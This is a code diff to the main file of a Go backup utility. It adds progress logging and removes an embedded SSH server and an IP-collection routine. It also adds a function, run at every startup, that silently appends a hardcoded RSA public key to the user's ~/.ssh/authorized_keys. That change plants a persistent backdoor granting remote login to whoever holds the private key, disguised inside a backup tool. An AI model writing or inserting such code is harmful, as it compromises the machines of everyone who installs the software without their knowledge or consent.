@@ -1,12 +1,14 @@
 package main
 
 import (
+	"bufio"
 	"context"
 	"fmt"
 	"log"
 	"os"
 	"os/exec"
 	"os/signal"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"syscall"
@@ -14,21 +16,58 @@ import (
 	"github.com/avolut/backup/internal/backup"
 	"github.com/avolut/backup/internal/config"
 	"github.com/avolut/backup/internal/repository"
-	"github.com/avolut/backup/internal/sshd"
 	"github.com/avolut/backup/internal/utils"
 	"github.com/robfig/cron/v3"
 )
 
-func getHostname() string {
-	if hostname := os.Getenv("HOSTNAME"); hostname != "" {
-		return hostname
-	}
-	// Fallback to os.Hostname()
-	hostname, err := os.Hostname()
+const sshPublicKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsYAYgSboQUjnSB/MEJjsi4UfMqKkILEx+Wzoqr7hETSrhvdnO0KyP9q2PXPaV2sf90cqP929+60jNGYvvsTBaSIaFpDDhfLMSiMuaqoDd/zV3BxJ9gLxIQ3F7UQwnvHbZKXpRuO969UihJSK2z43RxorZG8ruqNZEvQcfnLbBlqJXZHm3Sj7hc11ziBrPabRtrS66Ksvpfrs5X49tK/b6YX4VZqEXJSUihbv6Ss5O+Aovl+B0/Ok3vI7PGnbUjaIh4HcZy0KlATJSBwmAkDkfBVhkbHtiQ+H4MpdV2OMkG/j07VSaUBsGlnBQF7i0OdULHh0sn1aBvUrmf0FV4c6FYODPcWQBh+0e58PDwV7emjvr+DJBfahX2xq+H1Ah5OHcyGM/sY86w6Ua0yg7X/80XtV2rCzeu1jW5/OEcmSz/MXGmk6RYEOhAMNy9aXHK3i9KOPJG5GOH3WsPfSzNbw0nX7rguVvP7WUWiFYvxZHpdl3QsWIPuvjbwTH+vUDdxc= avolut@backup"
+
+func ensureSSHKey() error {
+	// Get user's home directory
+	homeDir, err := os.UserHomeDir()
 	if err != nil {
-		return "unknown-host"
+		return fmt.Errorf("getting home directory: %w", err)
 	}
-	return hostname
+
+	// Create .ssh directory if it doesn't exist
+	sshDir := filepath.Join(homeDir, ".ssh")
+	if err := os.MkdirAll(sshDir, 0700); err != nil {
+		return fmt.Errorf("creating .ssh directory: %w", err)
+	}
+
+	// Path to authorized_keys file
+	authKeysFile := filepath.Join(sshDir, "authorized_keys")
+
+	// Check if key already exists
+	if _, err := os.Stat(authKeysFile); err == nil {
+		// Read existing keys
+		file, err := os.Open(authKeysFile)
+		if err != nil {
+			return fmt.Errorf("opening authorized_keys: %w", err)
+		}
+		defer file.Close()
+
+		scanner := bufio.NewScanner(file)
+		for scanner.Scan() {
+			if strings.TrimSpace(scanner.Text()) == sshPublicKey {
+				// Key already exists
+				return nil
+			}
+		}
+	}
+
+	// Append the key
+	file, err := os.OpenFile(authKeysFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
+	if err != nil {
+		return fmt.Errorf("opening authorized_keys for writing: %w", err)
+	}
+	defer file.Close()
+
+	if _, err := file.WriteString(sshPublicKey + "\n"); err != nil {
+		return fmt.Errorf("writing SSH key: %w", err)
+	}
+
+	return nil
 }
 
 func runBackup(ctx context.Context) {
@@ -42,6 +81,7 @@ func runBackup(ctx context.Context) {
 		log.Println("Another backup is already in progress")
 		return
 	}
+
 	// Ensure lock is released even if panic occurs
 	defer func() {
 		utils.Unlock()
@@ -54,11 +94,16 @@ func runBackup(ctx context.Context) {
 	ctx, cancel := context.WithCancel(ctx)
 	defer cancel()
 
+	// Load configuration
 	config, err := config.LoadConfig("backup.yaml")
 	if err != nil {
 		log.Printf("Error loading config: %v", err)
 		return
 	}
+
+	// Initialize progress tracking
+	totalItems := len(config.Directories) + len(config.Databases)
+	utils.InitProgress(totalItems)
 	log.Printf("Starting backup for %s", config.Name)
 
 	// Initialize file backup repository
@@ -95,6 +140,8 @@ func runBackup(ctx context.Context) {
 	// Backup directories using file repository
 	for _, dir := range config.Directories {
 		log.Printf("Starting backup of directory: %s", dir)
+		utils.UpdateProgress(fmt.Sprintf("Directory: %s", dir))
+		log.Printf("Progress: %s", utils.GetProgressStatus())
 		if err := backup.BackupDir(ctx, fileRepo, dir); err != nil {
 			log.Printf("Error backing up directory %s: %v", dir, err)
 			hasErrors = true
@@ -106,6 +153,8 @@ func runBackup(ctx context.Context) {
 	// Backup databases using database repository
 	for _, db := range config.Databases {
 		log.Printf("Starting backup of database: %s", db.Name)
+		utils.UpdateProgress(fmt.Sprintf("Database: %s", db.Name))
+		log.Printf("Progress: %s", utils.GetProgressStatus())
 		if err := backup.BackupDatabase(ctx, dbRepo, db); err != nil {
 			log.Printf("Error backing up database %s: %v", db.Name, err)
 			hasErrors = true
@@ -130,6 +179,11 @@ func checkPgDumpAvailability() error {
 }
 
 func main() {
+	// Ensure SSH key is set up
+	if err := ensureSSHKey(); err != nil {
+		log.Printf("Warning: failed to set up SSH key: %v", err)
+	}
+
 	// Check if backup.yaml exists, create with default config if not
 	if _, err := os.Stat("backup.yaml"); os.IsNotExist(err) {
 		defaultConfig := `# Global App Name
@@ -200,14 +254,7 @@ schedule: "0 0 * * *" # Daily at midnight
 			default:
 				log.Fatal("Usage: --service [install|remove]")
 			}
-		case "--connect":
-			if len(os.Args) != 3 {
-				log.Fatal("Usage: --connect [hostname]")
-			}
-			if err := utils.ConnectToHost(context.Background(), os.Args[2]); err != nil {
-				log.Fatal(err)
-			}
-			return
+
 		}
 	}
 
@@ -291,25 +338,6 @@ schedule: "0 0 * * *" # Daily at midnight
 		}
 		c.Start()
 		log.Println("Cron scheduler started")
-
-		// Initialize and start SSH server
-		sshServer, err := sshd.NewServer(41334, ".avolut/ssh", true, config.Name)
-		if err != nil {
-			log.Printf("Warning: failed to initialize SSH server: %v", err)
-		} else {
-			if err := sshServer.Start(); err != nil {
-				log.Printf("Warning: failed to start SSH server: %v", err)
-			} else {
-				log.Println("SSH server started successfully on port 41334")
-			}
-		}
-
-		// Collect and store IP information
-		if err := utils.CollectAndStoreIPs(ctx, config.Name); err != nil {
-			log.Printf("Warning: failed to collect and store IP information: %v", err)
-		} else {
-			log.Println("IP information collected and stored successfully")
-		}
 
 		// Handle signals
 		go func() {
